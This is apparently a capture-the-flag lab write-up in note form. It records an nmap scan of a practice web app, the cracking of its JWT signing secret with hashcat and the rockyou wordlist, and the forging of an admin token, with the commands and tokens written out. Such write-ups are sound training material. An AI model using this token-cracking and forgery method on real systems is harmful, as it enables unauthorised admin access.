---
dg-publish: true
---
- Room Description
	- CyberSec Corp's new vulnerability management platform claims to have enterprise-grade security measures in place. They're confident in their defenses and believe their system is impenetrable. 🛡️ Your mission: conduct a comprehensive security assessment and see if their confidence is justified!
	
- 1) Ran NMAP scan against target
	- `nmap -sV (target IP)`
``` NMAP  
hacker:~$ nmap -sV 108.131.85.118
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-03 17:14 +0000
Nmap scan report for localhost (108.131.85.118)
Host is up (0.0000040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0 (protocol 2.0)
80/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.11)
```
  
- 2) Browsed to IP Address
	  - Website has login and signup pages
	  - Created account and logged in
	  - F12 to view developer tools
	  - Located JWT Cookie (JSON Web Token)
- 3) JWT Cookie - `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciIsImV4cCI6MTc4MDUwOTM3M30.MPJIB3ncwp1Tj_jQnVlDBqi4JgfNvEGDCiwR62c-Td8` 
	- Decoded with CyberChef using JWT Decode Option
``` CyberChef
		{
    "username": "test",
    "role": "user",
    "exp": 1780509373
}
```

- 4) Tried adjusting username to admin, but the token is signed so it failed
- 5) Use hashcat to get secret key of token
	- `hashcat -m 16500 -a 0 hash.txt ~/wordlists/rockyou.txt
	- !!!secret!!!
- 6) Use JWT.io to create new token signed with secret
	- `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzgwNTA5MzczfQ.Sl4FkcxYgHOTyxZhwrnFIfzs2Xy8KiNfXIW_g0E-c1Y`